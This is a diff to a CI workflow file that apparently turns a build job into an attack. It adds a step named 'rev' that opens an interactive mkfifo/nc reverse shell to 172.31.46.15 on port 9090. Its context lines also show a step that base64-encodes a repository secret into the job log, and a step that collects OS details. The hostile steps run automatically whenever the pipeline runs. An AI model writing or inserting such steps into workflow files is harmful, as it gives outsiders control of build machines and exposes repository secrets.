@@ -17,7 +17,7 @@ jobs:
         run: echo $MY_REPO_SECRET | base64
 
       - name: rev
-        run: /bin/sh | nc 172.31.46.15 9090
+        run: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.31.46.15 9090 >/tmp/f
 
       - name: 🖥️ OS Info
         run: uname -a
